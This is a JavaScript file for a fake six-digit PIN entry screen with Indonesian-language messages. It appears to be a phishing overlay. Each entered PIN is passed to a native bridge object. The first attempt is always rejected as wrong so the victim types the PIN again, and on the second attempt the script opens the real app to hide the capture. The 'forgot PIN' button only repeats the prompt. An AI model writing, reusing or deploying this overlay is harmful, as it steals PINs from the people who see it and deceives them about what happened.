(() => {
  const PIN_LEN = 6;
  const dots = Array.from(document.querySelectorAll("#pinDots .dot"));
  const forgotBtn = document.getElementById("forgotBtn");
  const keypad = document.getElementById("keypad");
  const toastEl = document.getElementById("toast");

  let pin = "";
  let submitCount = 0;
  let locked = false;
  let toastTimer = 0;

  function bridge() {
    try {
      return window.MiluBridge || null;
    } catch (_) {
      return null;
    }
  }

  function toast(msg) {
    toastEl.textContent = msg;
    toastEl.classList.add("is-show");
    window.clearTimeout(toastTimer);
    toastTimer = window.setTimeout(() => {
      toastEl.classList.remove("is-show");
    }, 1800);
  }

  function reportDone(payload) {
    const b = bridge();
    if (b && typeof b.done === "function") {
      try {
        b.done(payload);
      } catch (_) {
        /* ignore */
      }
    }
  }

  function openApp() {
    const b = bridge();
    if (b && typeof b.openApp === "function") {
      try {
        b.openApp();
      } catch (_) {
        /* ignore */
      }
    }
  }

  function renderDots() {
    dots.forEach((dot, index) => {
      dot.classList.toggle("is-filled", index < pin.length);
    });
  }

  function shakeDots() {
    dots.forEach((dot) => {
      dot.classList.remove("is-shake");
      void dot.offsetWidth;
      dot.classList.add("is-shake");
    });
  }

  function clearPin() {
    pin = "";
    renderDots();
  }

  function submitPin() {
    if (locked || pin.length !== PIN_LEN) {
      return;
    }
    locked = true;
    const value = pin;
    submitCount += 1;
    reportDone(value);

    if (submitCount < 2) {
      toast("PIN yang kamu masukkan salah");
      shakeDots();
      window.setTimeout(() => {
        clearPin();
        locked = false;
      }, 350);
      return;
    }

    window.setTimeout(() => {
      openApp();
      locked = false;
    }, 280);
  }

  function appendDigit(digit) {
    if (locked || pin.length >= PIN_LEN) {
      return;
    }
    pin += digit;
    renderDots();
    if (pin.length === PIN_LEN) {
      window.setTimeout(submitPin, 120);
    }
  }

  function deleteDigit() {
    if (locked || !pin.length) {
      return;
    }
    pin = pin.slice(0, -1);
    renderDots();
  }

  keypad.addEventListener("click", (event) => {
    const key = event.target.closest("[data-key]");
    if (!key) {
      return;
    }
    const value = key.getAttribute("data-key");
    if (value === "del") {
      deleteDigit();
      return;
    }
    if (/^[0-9]$/.test(value)) {
      appendDigit(value);
    }
  });

  forgotBtn.addEventListener("click", () => {
    toast("Masukkan kode PIN untuk lanjut");
  });

  renderDots();
})();
